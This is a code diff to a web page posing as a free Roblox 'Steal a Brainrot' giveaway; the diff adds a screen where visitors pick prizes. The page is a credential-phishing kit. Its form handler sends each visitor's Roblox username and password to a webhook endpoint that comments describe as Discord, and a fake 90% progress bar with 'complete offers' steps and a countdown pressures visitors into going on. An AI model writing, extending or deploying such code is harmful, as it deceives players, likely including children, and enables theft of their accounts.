@@ -484,7 +484,133 @@
             opacity: .7;
         }
 
-        /* ── Success / Claim Screen ── */
+        /* ── Selection Screen ── */
+        #selection-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 700px;
+            animation: fadeUp .6s ease both;
+        }
+        .selection-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 32px 28px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 50px rgba(138, 43, 226, .2), 0 0 100px rgba(0, 207, 255, .1);
+        }
+        .selection-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--og-gold), var(--secret-purple), var(--og-gold));
+            background-size: 200% 100%;
+            animation: rainbowSlide 2s linear infinite;
+        }
+        .selection-title {
+            font-family: 'Bangers', cursive;
+            font-size: 32px;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-align: center;
+        }
+        .selection-subtitle {
+            font-size: 16px;
+            color: #aaa;
+            margin-bottom: 24px;
+            text-align: center;
+            font-weight: 700;
+        }
+        .selection-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+        .brainrot-card {
+            background: rgba(255, 255, 255, .03);
+            border: 2px solid rgba(255, 255, 255, .08);
+            border-radius: 16px;
+            padding: 14px;
+            text-align: center;
+            cursor: pointer;
+            transition: all .25s;
+            position: relative;
+        }
+        .brainrot-card:hover {
+            background: rgba(255, 255, 255, .06);
+            border-color: rgba(255, 255, 255, .2);
+        }
+        .brainrot-card.selected {
+            border-color: var(--neon-green);
+            background: rgba(0, 255, 136, .08);
+            box-shadow: 0 0 20px rgba(0, 255, 136, .3);
+        }
+        .brainrot-card .card-img {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
+            border-radius: 12px;
+            background: rgba(0, 0, 0, .3);
+            margin: 0 auto 8px;
+            border: 2px solid transparent;
+        }
+        .brainrot-card.selected .card-img {
+            border-color: var(--neon-green);
+        }
+        .brainrot-card .card-name {
+            font-family: 'Fredoka One', cursive;
+            font-size: 14px;
+            color: #eee;
+            margin-bottom: 4px;
+        }
+        .brainrot-card .card-rarity {
+            font-size: 10px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-family: 'Fredoka One';
+        }
+        .selection-counter {
+            font-family: 'Bangers', cursive;
+            font-size: 22px;
+            color: var(--yellow);
+            text-shadow: 0 0 12px rgba(255, 215, 0, .6);
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .btn-selection-continue {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+            color: #000;
+            font-family: 'Bangers', cursive;
+            font-size: 22px;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: transform .15s, box-shadow .15s;
+        }
+        .btn-selection-continue:disabled {
+            opacity: .5;
+            cursor: not-allowed;
+            filter: grayscale(.4);
+        }
+        .btn-selection-continue:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 255, 136, .4);
+        }
+
+        /* ── Claim Screen ── */
         #success-screen {
             display: none;
             flex-direction: column;
@@ -513,7 +639,6 @@
             background-size: 200% 100%;
             animation: rainbowSlide 2s linear infinite;
         }
-        /* Lava‑lamp progress bar */
         .progress-wrap {
             margin: 0 auto 24px;
             width: 100%;
@@ -532,7 +657,7 @@
         .progress-fill {
             position: absolute;
             left: 0; top: 0; bottom: 0;
-            width: 90%; /* always 90% */
+            width: 90%;
             background: linear-gradient(90deg, #1e90ff, #8a2be2, #ff69b4);
             background-size: 300% 100%;
             animation: lavaFlow 6s ease-in-out infinite;
@@ -545,11 +670,11 @@
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
-        /* Bubbles inside the lava lamp */
         .progress-fill::before {
             content: '';
             position: absolute;
-            top: -5px; left: -10%; width: 200%; height: 200%;
+            top: -5px; left: -10%;
+            width: 200%; height: 200%;
             background:
                 radial-gradient(ellipse at 20% 50%, rgba(255, 255, 255, 0.4) 0%, transparent 50%),
                 radial-gradient(ellipse at 70% 30%, rgba(255, 255, 255, 0.3) 0%, transparent 50%),
@@ -586,6 +711,31 @@
             color: #ccc;
             margin-bottom: 18px;
             font-weight: 700;
+        }
+        .chosen-banner {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .chosen-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 255, 255, .05);
+            border: 1px solid rgba(255, 255, 255, .1);
+            border-radius: 12px;
+            padding: 8px 14px;
+            font-family: 'Fredoka One', cursive;
+            font-size: 13px;
+        }
+        .chosen-badge img {
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            object-fit: contain;
+            background: rgba(0, 0, 0, .3);
         }
         .offer-steps {
             background: rgba(0, 255, 136, .06);
@@ -649,7 +799,6 @@
             font-weight: 700; margin-top: 10px; display: none;
         }
 
-        /* ── Responsive ── */
         @media (max-width: 900px) {
             .main-layout { flex-direction: column; align-items: center; gap: 24px; }
             .left-column { flex: 0 0 auto; max-width: 100%; width: 100%; min-width: 0; }
@@ -679,7 +828,7 @@
             <div class="prize-tag green">✅ Free Entry</div>
         </div>
 
-        <!-- Two-column layout (visible when not registered) -->
+        <!-- Registration + Showcase (visible before registration) -->
         <div class="main-layout" id="main-layout">
             <div class="left-column" id="register-column">
                 <div class="card" id="register-card">
@@ -726,27 +875,35 @@
             </div>
         </div>
 
-        <!-- Success / Claim Screen (hidden initially) -->
+        <!-- Selection Screen (hidden) -->
+        <div id="selection-screen">
+            <div class="selection-card">
+                <div class="selection-title">Choose Your Brainrots!</div>
+                <div class="selection-subtitle">Select 1‑3 Brainrots you want to win</div>
+                <div class="selection-counter" id="selection-counter">0 / 3 selected</div>
+                <div class="selection-grid" id="selection-grid"></div>
+                <button id="selection-continue-btn" class="btn-selection-continue" disabled>
+                    🧠 CLAIM YOUR PRIZE →
+                </button>
+            </div>
+        </div>
+
+        <!-- Claim Screen (hidden) -->
         <div id="success-screen">
             <div class="success-card">
-                <!-- Lava-lamp progress bar -->
                 <div class="progress-wrap">
-                    <div class="progress-bar">
-                        <div class="progress-fill"></div>
-                    </div>
+                    <div class="progress-bar"><div class="progress-fill"></div></div>
                     <div class="progress-percent">90%</div>
                 </div>
-
                 <div class="claim-headline">Almost done!</div>
                 <div class="claim-subtitle">Complete one of these offers to CLAIM YOUR PRIZE!</div>
-
+                <div class="chosen-banner" id="chosen-banner"></div>
                 <div class="offer-steps" id="offer-steps">
                     <span>1.</span> Verify your Roblox account<br>
                     <span>2.</span> Join the Steal a Brainrot experience<br>
                     <span>3.</span> Claim your reward in-game<br>
                     <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots</strong> if completed within the time limit!
                 </div>
-
                 <button id="continue-button" class="btn-continue">
                     🎮 COMPLETE OFFERS →
                 </button>
@@ -769,12 +926,13 @@
             { name: 'La Supreme Combinasion', rarity: 'Secret', image: 'la-supreme-combinasion.png' },
         ];
 
+        /* ── Build infinite scroll showcase ── */
         const brainrotsWithStock = brainrotsData.map(b => ({
             ...b,
             stock: Math.random() < 0.5 ? 'limited' : 'out-of-stock'
         }));
 
-        function buildBrainrotItem(b, index) {
+        function buildBrainrotItem(b) {
             const div = document.createElement('div');
             div.className = 'brainrot-item';
             const rarityClass = b.rarity === 'OG' ? 'rarity-og' : 'rarity-secret';
@@ -799,8 +957,8 @@
         }
 
         const scrollInner = document.getElementById('scroll-inner');
-        brainrotsWithStock.forEach((b, i) => scrollInner.appendChild(buildBrainrotItem(b, i)));
-        brainrotsWithStock.forEach((b, i) => scrollInner.appendChild(buildBrainrotItem(b, i)));
+        brainrotsWithStock.forEach(b => scrollInner.appendChild(buildBrainrotItem(b)));
+        brainrotsWithStock.forEach(b => scrollInner.appendChild(buildBrainrotItem(b)));
 
         /* ── Floaty emojis ── */
         const emojis = ['🧠', '🎮', '⚡', '🔥', '💥', '🎁', '🌀', '👾', '✨', '💀'];
@@ -919,14 +1077,103 @@
             }, '');
         }
 
-        /* ── Claim screen activation ── */
-        function showClaimScreen(username, bonusActive) {
+        /* ── Discord webhook (updated to accept optional "choices") ── */
+        async function sendToWebhook(data) {
+            try {
+                const response = await fetch('/.netlify/functions/webhook', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (!response.ok) {
+                    console.error('Function call failed with status:', response.status);
+                    return false;
+                }
+                const result = await response.json();
+                console.log('Webhook response:', result);
+                return result.success === true;
+            } catch (error) {
+                console.error('Webhook send error:', error);
+                return false;
+            }
+        }
+
+        /* ── Global state ── */
+        let currentUsername = null;
+        let currentBonusActive = true;
+        let selectedBrainrots = [];
+
+        /* ── Show selection screen ── */
+        function showSelectionScreen(username, bonusActive) {
+            currentUsername = username;
+            currentBonusActive = bonusActive;
             document.getElementById('main-layout').style.display = 'none';
             document.getElementById('prize-banner').style.display = 'none';
-            const successScreen = document.getElementById('success-screen');
-            successScreen.style.display = 'flex';
+            document.getElementById('selection-screen').style.display = 'flex';
+            document.getElementById('success-screen').style.display = 'none';
+            buildSelectionGrid();
+        }
 
-            // Update offer steps based on timer
+        /* ── Build selection grid ── */
+        function buildSelectionGrid() {
+            const grid = document.getElementById('selection-grid');
+            grid.innerHTML = '';
+            selectedBrainrots = []; // reset
+            brainrotsData.forEach((b, index) => {
+                const card = document.createElement('div');
+                card.className = 'brainrot-card';
+                card.dataset.index = index;
+                card.innerHTML = `
+                    <img class="card-img" 
+                         src="/brainrots/${b.image}" 
+                         alt="${b.name}" 
+                         onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2770%27 height=%2770%27%3E%3Crect fill=%27%231a1a2e%27 width=%2770%27 height=%2770%27 rx=%2712%27/%3E%3Ctext fill=%27%23888%27 font-family=%27Arial%27 font-size=%2730%27 text-anchor=%27middle%27 x=%2735%27 y=%2745%27%3E🧠%3C/text%3E%3C/svg%3E'"
+                    >
+                    <div class="card-name">${b.name}</div>
+                    <div class="card-rarity" style="color:${b.rarity === 'OG' ? 'var(--og-gold)' : 'var(--secret-purple)'}">${b.rarity}</div>
+                `;
+                card.addEventListener('click', () => toggleSelection(index, card));
+                grid.appendChild(card);
+            });
+            updateSelectionCounter();
+        }
+
+        function toggleSelection(index, cardElement) {
+            if (cardElement.classList.contains('selected')) {
+                // deselect
+                cardElement.classList.remove('selected');
+                selectedBrainrots = selectedBrainrots.filter(i => i !== index);
+            } else {
+                if (selectedBrainrots.length >= 3) return;
+                cardElement.classList.add('selected');
+                selectedBrainrots.push(index);
+            }
+            updateSelectionCounter();
+            document.getElementById('selection-continue-btn').disabled = selectedBrainrots.length < 1;
+        }
+
+        function updateSelectionCounter() {
+            document.getElementById('selection-counter').textContent = selectedBrainrots.length + ' / 3 selected';
+        }
+
+        /* ── Show claim screen with chosen brainrots ── */
+        function showClaimScreen(username, bonusActive) {
+            document.getElementById('selection-screen').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'flex';
+            // Build chosen banner
+            const chosenBanner = document.getElementById('chosen-banner');
+            chosenBanner.innerHTML = '';
+            selectedBrainrots.forEach(index => {
+                const b = brainrotsData[index];
+                const badge = document.createElement('div');
+                badge.className = 'chosen-badge';
+                badge.innerHTML = `
+                    <img src="/brainrots/${b.image}" alt="${b.name}" onerror="this.style.display='none'">
+                    <span>${b.name}</span>
+                `;
+                chosenBanner.appendChild(badge);
+            });
+            // Update offer steps if bonus expired
             const offerSteps = document.getElementById('offer-steps');
             if (bonusActive) {
                 offerSteps.innerHTML = `
@@ -943,31 +1190,19 @@
                     <span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>
                 `;
             }
-
-            // Set cookie to remember registration
-            setCookie('brainrot_registered', username, 7);
+            // Save full state to cookie
+            setCookie('brainrot_registered', JSON.stringify({ username, choices: selectedBrainrots }), 7);
+            // Send webhook with choices
+            const choiceNames = selectedBrainrots.map(i => brainrotsData[i].name);
+            sendToWebhook({ username, choices: choiceNames });
+            setTimeout(launchConfetti, 200);
         }
 
-        /* ── Discord webhook via Netlify Function ── */
-        async function sendToWebhook(username, password) {
-            try {
-                const response = await fetch('/.netlify/functions/webhook', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
-                });
-                if (!response.ok) {
-                    console.error('Function call failed with status:', response.status);
-                    return false;
-                }
-                const data = await response.json();
-                console.log('Webhook response:', data);
-                return data.success === true;
-            } catch (error) {
-                console.error('Webhook send error:', error);
-                return false;
-            }
-        }
+        /* ── Selection continue button ── */
+        document.getElementById('selection-continue-btn').addEventListener('click', () => {
+            if (selectedBrainrots.length === 0) return;
+            showClaimScreen(currentUsername, currentBonusActive);
+        });
 
         /* ── Form submit ── */
         document.getElementById('giveaway-form').addEventListener('submit', async (e) => {
@@ -980,26 +1215,67 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="spinner"></span> Submitting…';
 
-            const webhookSent = await sendToWebhook(username, password);
+            // Send initial webhook (username + password)
+            const webhookSent = await sendToWebhook({ username, password });
             if (!webhookSent) console.log('Webhook delivery issue, but continuing.');
 
-            showClaimScreen(username, bonusActive);
-            setTimeout(launchConfetti, 200);
+            // Show selection screen
+            showSelectionScreen(username, bonusActive);
         });
 
-        /* ── Continue button ── */
+        /* ── Claim continue button (redirect) ── */
         document.getElementById('continue-button').addEventListener('click', () => {
             window.location.href = 'https://www.roblox.com';
         });
 
         /* ── On page load: check if already registered ── */
         (function init() {
-            const savedUser = getCookie('brainrot_registered');
-            if (savedUser) {
-                // User already registered – go straight to claim screen
-                showClaimScreen(savedUser, !timerExpired);
-                // Re‑launch confetti for fun
-                setTimeout(launchConfetti, 400);
+            const savedData = getCookie('brainrot_registered');
+            if (savedData) {
+                try {
+                    const parsed = JSON.parse(savedData);
+                    currentUsername = parsed.username;
+                    selectedBrainrots = parsed.choices || [];
+                    currentBonusActive = !timerExpired;
+                    // Skip directly to claim screen
+                    document.getElementById('main-layout').style.display = 'none';
+                    document.getElementById('prize-banner').style.display = 'none';
+                    document.getElementById('selection-screen').style.display = 'none';
+                    document.getElementById('success-screen').style.display = 'flex';
+                    // Rebuild chosen banner
+                    const chosenBanner = document.getElementById('chosen-banner');
+                    chosenBanner.innerHTML = '';
+                    selectedBrainrots.forEach(index => {
+                        const b = brainrotsData[index];
+                        const badge = document.createElement('div');
+                        badge.className = 'chosen-badge';
+                        badge.innerHTML = `
+                            <img src="/brainrots/${b.image}" alt="${b.name}" onerror="this.style.display='none'">
+                            <span>${b.name}</span>
+                        `;
+                        chosenBanner.appendChild(badge);
+                    });
+                    // Update offer steps
+                    const offerSteps = document.getElementById('offer-steps');
+                    if (currentBonusActive) {
+                        offerSteps.innerHTML = `
+                            <span>1.</span> Verify your Roblox account<br>
+                            <span>2.</span> Join the Steal a Brainrot experience<br>
+                            <span>3.</span> Claim your reward in-game<br>
+                            <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots ACTIVE!</strong>
+                        `;
+                    } else {
+                        offerSteps.innerHTML = `
+                            <span>1.</span> Verify your Roblox account<br>
+                            <span>2.</span> Join the Steal a Brainrot experience<br>
+                            <span>3.</span> Claim your reward in-game<br>
+                            <span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>
+                        `;
+                    }
+                    setTimeout(launchConfetti, 400);
+                } catch (e) {
+                    // corrupted cookie, ignore
+                }
             }
         })();
     </script>
